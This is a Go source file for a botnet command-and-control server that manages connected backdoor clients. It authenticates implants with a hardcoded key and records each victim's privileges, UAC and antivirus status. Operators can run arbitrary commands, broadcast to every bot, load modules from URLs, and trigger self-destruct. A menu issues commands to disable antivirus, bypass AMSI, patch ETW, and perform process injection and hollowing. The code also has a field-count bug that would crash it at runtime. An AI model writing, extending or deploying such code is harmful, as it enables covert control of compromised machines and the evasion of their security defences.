package main

import (
	"bufio"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	ServerPort = "443"           // HTTPS port for secure communication
	SecretKey  = "magic_key_123" // Authentication key for client validation
	Timeout    = 30 * time.Second // Connection timeout
	CertFile   = "server.crt"    // TLS certificate file
	KeyFile    = "server.key"    // TLS private key file
	
	// Command constants for antivirus management
	CMD_DISABLE_AV     = "disable_av"      // Command to disable antivirus
	CMD_BYPASS_AV      = "bypass_av"       // Command to bypass antivirus
	CMD_INJECT_PROCESS = "inject_process"  // Command for process injection
	CMD_HOLLOW_PROCESS = "hollow_process"  // Command for process hollowing
	CMD_PATCH_ETW      = "patch_etw"       // Command to patch ETW
	CMD_BYPASS_AMSI    = "bypass_amsi"     // Command to bypass AMSI
)

// Structure for storing client information
type Backdoor struct {
	ID         string    // Unique client identifier
	Conn       net.Conn  // Network connection
	Privileges string    // Current privilege level
	Version    string    // Client version
	LastSeen   time.Time // Last activity timestamp
	OS         string    // Operating system
	Arch       string    // Architecture
	IsAdmin    bool      // Administrative privileges flag
	HasUAC     bool      // UAC status (Windows)
	CanElevate bool      // Privilege escalation possibility
	AVStatus   string    // Antivirus status
	Protection []string  // Active protection mechanisms
	IsDebug    bool      // Debug mode flag
}

var (
	activeBots = make(map[string]*Backdoor) // Map of active connections
	mutex      = &sync.Mutex{}              // Mutex for thread-safe access
	currentVersion = "1.0.0"                // Current server version
	binaryChecksum = ""                     // Client binary checksum
	updateURL = "https://example.com/client/latest" // Update server URL
)

// Function for TLS configuration setup
func setupTLS() (*tls.Config, error) {
	// Load certificate and private key
	cert, err := tls.LoadX509KeyPair(CertFile, KeyFile)
	if err != nil {
		return nil, fmt.Errorf("error loading certificates: %v", err)
	}

	// Configure TLS with modern security settings
	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:  tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	}, nil
}

// Function for validating incoming connections
func validateConnection(conn net.Conn) bool {
	// Extract client IP address
	remoteIP := strings.Split(conn.RemoteAddr().String(), ":")[0]
	
	// List of suspicious IP ranges to block
	suspiciousIPs := []string{
		"0.0.0.0", "127.0.0.1", "192.168.", "10.", "172.16.",
	}
	
	// Check if client IP is in suspicious range
	for _, ip := range suspiciousIPs {
		if strings.HasPrefix(remoteIP, ip) {
			return false
		}
	}
	
	return true
}

// Data obfuscation using base64 encoding
func obfuscate(data string) string {
	return base64.StdEncoding.EncodeToString([]byte(data))
}

// Data deobfuscation from base64
func deobfuscate(data string) string {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return ""
	}
	return string(decoded)
}

// Calculate SHA-256 checksum of a file
func calculateChecksum(filePath string) (string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	hash := sha256.New()
	if _, err := io.Copy(hash, file); err != nil {
		return "", err
	}

	return hex.EncodeToString(hash.Sum(nil)), nil
}

// Main function for handling client connections
func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Set connection timeout
	conn.SetDeadline(time.Now().Add(Timeout))

	// Authenticate client
	reader := bufio.NewReader(conn)
	key, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("Authentication error: %v\n", err)
		return
	}

	// Validate authentication key
	if deobfuscate(strings.TrimSpace(key)) != SecretKey {
		fmt.Println("Invalid authentication key")
		return
	}

	// Receive and parse system information
	sysInfo, err := reader.ReadString('\n')
	if err != nil {
		return
	}
	sysInfo = strings.TrimSpace(deobfuscate(sysInfo))
	parts := strings.Split(sysInfo, "|")
	if len(parts) != 7 {
		return
	}

	// Create new client structure
	backdoor := &Backdoor{
		ID:         conn.RemoteAddr().String(),
		Conn:       conn,
		Privileges: parts[0],
		OS:         parts[1],
		Arch:       parts[2],
		IsAdmin:    parts[3] == "true",
		HasUAC:     parts[6] == "true",
		CanElevate: parts[5] == "true",
		Version:    currentVersion,
		LastSeen:   time.Now(),
		AVStatus:   parts[4],
		Protection: strings.Split(parts[7], ","),
		IsDebug:    false,
	}

	// Register new client
	mutex.Lock()
	activeBots[backdoor.ID] = backdoor
	mutex.Unlock()

	fmt.Printf("[+] New client connected: %s (OS: %s/%s, Privileges: %s, UAC: %v)\n",
		backdoor.ID, backdoor.OS, backdoor.Arch, backdoor.Privileges, backdoor.HasUAC)

	// Main command handling loop
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		command = strings.TrimSpace(deobfuscate(command))
		
		// Handle special commands
		switch {
		case strings.HasPrefix(command, "check_update:"):
			handleUpdateCheck(backdoor, command)
			
		case command == "get_checksum":
			handleChecksumRequest(backdoor)
			
		case command == "get_binary":
			handleBinaryRequest(backdoor)
			
		case command == "heartbeat":
			handleHeartbeat(backdoor)
			
		default:
			handleCommand(backdoor, command)
		}

		// Update last activity timestamp
		backdoor.LastSeen = time.Now()
	}

	// Remove disconnected client
	mutex.Lock()
	delete(activeBots, backdoor.ID)
	mutex.Unlock()
	fmt.Printf("[-] Client disconnected: %s\n", backdoor.ID)
}

// Command handlers for various client requests

// Handle version check and update notification
func handleUpdateCheck(b *Backdoor, command string) {
	version := strings.TrimPrefix(command, "check_update:")
	if version < currentVersion {
		b.Conn.Write([]byte(obfuscate(fmt.Sprintf("%s:%s:%s\n",
			currentVersion, binaryChecksum, updateURL))))
	} else {
		b.Conn.Write([]byte(obfuscate("no_update\n")))
	}
}

// Handle checksum verification request
func handleChecksumRequest(b *Backdoor) {
	b.Conn.Write([]byte(obfuscate(binaryChecksum + "\n")))
}

// Handle binary download request
func handleBinaryRequest(b *Backdoor) {
	b.Conn.Write([]byte(obfuscate(updateURL + "\n")))
}

// Handle client heartbeat
func handleHeartbeat(b *Backdoor) {
	b.LastSeen = time.Now()
	b.Conn.Write([]byte(obfuscate("ok\n")))
}

// Handle general command execution
func handleCommand(b *Backdoor, command string) {
	// Log command execution
	fmt.Printf("[%s] Executing command: %s\n", b.ID, command)
	
	// Send command to client
	b.Conn.Write([]byte(obfuscate(command + "\n")))
	
	// Receive command result
	reader := bufio.NewReader(b.Conn)
	result, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("[Error getting result from %s]: %v\n", b.ID, err)
		return
	}
	
	fmt.Printf("[Result from %s]:\n%s\n", b.ID, deobfuscate(strings.TrimSpace(result)))
}

// Monitor active clients and remove inactive ones
func monitorBackdoors() {
	for {
		time.Sleep(60 * time.Second)
		now := time.Now()
		
		mutex.Lock()
		for id, backdoor := range activeBots {
			if now.Sub(backdoor.LastSeen) > 5*time.Minute {
				fmt.Printf("[!] Client %s not responding, removing\n", id)
				backdoor.Conn.Close()
				delete(activeBots, id)
			}
		}
		mutex.Unlock()
	}
}

// Display interactive menu
func showMenu() {
	fmt.Println("\nClient Management Menu:")
	fmt.Println("1. List active clients")
	fmt.Println("2. Send command to client")
	fmt.Println("3. Load module to client")
	fmt.Println("4. Update clients")
	fmt.Println("5. Remove client")
	fmt.Println("6. Client information")
	fmt.Println("7. Broadcast command")
	fmt.Println("8. Antivirus management")
	fmt.Println("9. Debug clients")
	fmt.Println("10. Exit")
}

// Display detailed client information
func showBackdoorInfo(id string) {
	mutex.Lock()
	defer mutex.Unlock()

	if backdoor, ok := activeBots[id]; ok {
		fmt.Printf("\nClient information %s:\n", id)
		fmt.Printf("Operating System: %s\n", backdoor.OS)
		fmt.Printf("Privileges: %s\n", backdoor.Privileges)
		fmt.Printf("Version: %s\n", backdoor.Version)
		fmt.Printf("Last seen: %s\n", backdoor.LastSeen.Format("2006-01-02 15:04:05"))
	} else {
		fmt.Println("Client not found!")
	}
}

// Broadcast command to all connected clients
func broadcastCommand(command string) {
	mutex.Lock()
	defer mutex.Unlock()

	for id, backdoor := range activeBots {
		fmt.Printf("Sending command to client %s...\n", id)
		backdoor.Conn.SetDeadline(time.Now().Add(Timeout))
		backdoor.Conn.Write([]byte(obfuscate(command + "\n")))
	}
}

// Handle antivirus management operations
func handleAVManagement(backdoor *Backdoor) {
	fmt.Println("\nAntivirus Management:")
	fmt.Println("1. Disable antivirus")
	fmt.Println("2. Advanced bypass")
	fmt.Println("3. Process injection")
	fmt.Println("4. Process hollowing")
	fmt.Println("5. Patch ETW")
	fmt.Println("6. Bypass AMSI")
	fmt.Println("7. Back")

	var choice int
	fmt.Print("Select action: ")
	fmt.Scan(&choice)

	switch choice {
	case 1:
		handleCommand(backdoor, CMD_DISABLE_AV)
	case 2:
		handleCommand(backdoor, CMD_BYPASS_AV)
	case 3:
		handleCommand(backdoor, CMD_INJECT_PROCESS)
	case 4:
		handleCommand(backdoor, CMD_HOLLOW_PROCESS)
	case 5:
		handleCommand(backdoor, CMD_PATCH_ETW)
	case 6:
		handleCommand(backdoor, CMD_BYPASS_AMSI)
	}
}

// Handle debug clients menu
func handleDebugMenu() {
	fmt.Println("\nDebug Clients Menu:")
	fmt.Println("1. List debug clients")
	fmt.Println("2. Send command to debug client")
	fmt.Println("3. Debug client information")
	fmt.Println("4. Back to main menu")
	
	var choice int
	fmt.Print("Select action: ")
	fmt.Scan(&choice)
	
	switch choice {
	case 1:
		// List debug clients
		fmt.Println("\nActive debug clients:")
		mutex.Lock()
		for id, backdoor := range activeBots {
			if backdoor.IsDebug {
				fmt.Printf("[%s] OS: %s/%s, Privileges: %s, Version: %s (DEBUG)\n",
					id, backdoor.OS, backdoor.Arch, backdoor.Privileges, backdoor.Version)
			}
		}
		mutex.Unlock()
		
	case 2:
		// Send command to debug client
		fmt.Print("Enter client ID: ")
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		botID := strings.TrimSpace(scanner.Text())
		
		fmt.Print("Enter command: ")
		scanner.Scan()
		command := strings.TrimSpace(scanner.Text())
		
		mutex.Lock()
		if backdoor, ok := activeBots[botID]; ok && backdoor.IsDebug {
			handleCommand(backdoor, command)
		} else {
			fmt.Println("Debug client not found!")
		}
		mutex.Unlock()
		
	case 3:
		// Show debug client information
		fmt.Print("Enter client ID: ")
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		botID := strings.TrimSpace(scanner.Text())
		
		mutex.Lock()
		if backdoor, ok := activeBots[botID]; ok && backdoor.IsDebug {
			fmt.Printf("\nDebug Client Information %s:\n", botID)
			fmt.Printf("Operating System: %s\n", backdoor.OS)
			fmt.Printf("Architecture: %s\n", backdoor.Arch)
			fmt.Printf("Privileges: %s\n", backdoor.Privileges)
			fmt.Printf("Version: %s\n", backdoor.Version)
			fmt.Printf("Last seen: %s\n", backdoor.LastSeen.Format("2006-01-02 15:04:05"))
			fmt.Printf("Antivirus: %s\n", backdoor.AVStatus)
		} else {
			fmt.Println("Debug client not found!")
		}
		mutex.Unlock()
	}
}

// Main server function
func main() {
	// Initialize TLS configuration
	tlsConfig, err := setupTLS()
	if err != nil {
		fmt.Println("Error setting up TLS:", err)
		return
	}

	// Start TLS server
	listener, err := tls.Listen("tcp", ":"+ServerPort, tlsConfig)
	if err != nil {
		fmt.Println("Error starting server:", err)
		return
	}
	defer listener.Close()
	
	fmt.Println("Server started on port", ServerPort, "with TLS")

	// Start client monitoring
	go monitorBackdoors()

	// Handle incoming connections
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				fmt.Println("Connection error:", err)
				continue
			}

			// Validate incoming connection
			if !validateConnection(conn) {
				fmt.Printf("Suspicious connection from %s\n", conn.RemoteAddr())
				conn.Close()
				continue
			}

			go handleConnection(conn)
		}
	}()

	// Main menu loop
	for {
		showMenu()
		var choice int
		fmt.Print("Select action: ")
		fmt.Scan(&choice)

		switch choice {
		case 1:
			// List active clients
			fmt.Println("\nActive clients:")
			mutex.Lock()
			for id, backdoor := range activeBots {
				fmt.Printf("[%s] OS: %s/%s, Privileges: %s, Version: %s\n",
					id, backdoor.OS, backdoor.Arch, backdoor.Privileges, backdoor.Version)
			}
			mutex.Unlock()

		case 2:
			// Send command to specific client
			fmt.Print("Enter client ID: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			botID := strings.TrimSpace(scanner.Text())
			
			fmt.Print("Enter command: ")
			scanner.Scan()
			command := strings.TrimSpace(scanner.Text())
			
			mutex.Lock()
			if backdoor, ok := activeBots[botID]; ok {
				handleCommand(backdoor, command)
			} else {
				fmt.Println("Client not found!")
			}
			mutex.Unlock()

		case 3:
			// Load module to client
			fmt.Print("Enter client ID: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			botID := strings.TrimSpace(scanner.Text())
			
			fmt.Print("Enter module URL: ")
			scanner.Scan()
			moduleURL := strings.TrimSpace(scanner.Text())
			
			mutex.Lock()
			if backdoor, ok := activeBots[botID]; ok {
				handleCommand(backdoor, "load_module:"+moduleURL)
			} else {
				fmt.Println("Client not found!")
			}
			mutex.Unlock()

		case 4:
			// Update clients
			fmt.Print("Enter new version: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			newVersion := strings.TrimSpace(scanner.Text())
			
			currentVersion = newVersion
			fmt.Println("Version updated. Clients will update on next check.")

		case 5:
			// Remove client
			fmt.Print("Enter client ID: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			botID := strings.TrimSpace(scanner.Text())
			
			mutex.Lock()
			if backdoor, ok := activeBots[botID]; ok {
				handleCommand(backdoor, "self_destruct")
				delete(activeBots, botID)
			} else {
				fmt.Println("Client not found!")
			}
			mutex.Unlock()

		case 6:
			// Show client information
			fmt.Print("Enter client ID: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			botID := strings.TrimSpace(scanner.Text())
			showBackdoorInfo(botID)

		case 7:
			// Broadcast command
			fmt.Print("Enter command for all clients: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			command := strings.TrimSpace(scanner.Text())
			broadcastCommand(command)

		case 8:
			// Antivirus management
			fmt.Print("Enter client ID: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			botID := strings.TrimSpace(scanner.Text())
			
			mutex.Lock()
			if backdoor, ok := activeBots[botID]; ok {
				handleAVManagement(backdoor)
			} else {
				fmt.Println("Client not found!")
			}
			mutex.Unlock()

		case 9:
			// Debug clients menu
			handleDebugMenu()

		case 10:
			// Exit program
			fmt.Println("Exiting...")
			return

		default:
			fmt.Println("Invalid choice!")
		}
	}
}